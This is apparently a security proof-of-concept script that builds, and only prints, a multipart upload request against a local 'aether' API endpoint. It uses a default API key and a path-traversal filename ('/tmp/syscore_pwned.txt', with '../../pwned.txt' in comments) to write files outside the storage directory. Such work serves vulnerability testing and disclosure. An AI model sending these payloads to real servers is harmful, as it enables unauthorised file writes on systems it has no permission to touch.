import sys
import uuid
import os

# Configuration
TARGET_URL = "http://localhost:3001/api/v1/aether"
# The default API key in the codebase is "update_me_please" if AETHER_UPLOAD_KEY is not set.
API_KEY = os.getenv("AETHER_UPLOAD_KEY", "update_me_please")

def generate_payload():
    boundary = "------------------------" + uuid.uuid4().hex

    # Malicious filename attempting to write outside the storage directory
    # The server joins "storage/aether/<version>" with this filename
    # If filename is "../../pwned.txt", it writes to "storage/pwned.txt"
    # If filename is "/tmp/pwned.txt" (absolute), it writes to "/tmp/pwned.txt"
    malicious_filename = "/tmp/syscore_pwned.txt"
    version = "9.9.9-malicious"

    body = []

    # Version field
    body.append(f"--{boundary}")
    body.append('Content-Disposition: form-data; name="version"')
    body.append('')
    body.append(version)

    # File field with malicious filename
    body.append(f"--{boundary}")
    body.append(f'Content-Disposition: form-data; name="file"; filename="{malicious_filename}"')
    body.append('Content-Type: text/plain')
    body.append('')
    body.append('PWNED BY SENTINEL')

    # End boundary
    body.append(f"--{boundary}--")
    body.append('')

    payload = "\r\n".join(body)

    headers = {
        "Content-Type": f"multipart/form-data; boundary={boundary}",
        "Authorization": f"Bearer {API_KEY}"
    }

    print(f"--- TARGET: {TARGET_URL} ---")
    print("--- HEADERS ---")
    for k, v in headers.items():
        print(f"{k}: {v}")
    print("\n--- BODY (Truncated) ---")
    print(payload)

if __name__ == "__main__":
    generate_payload()
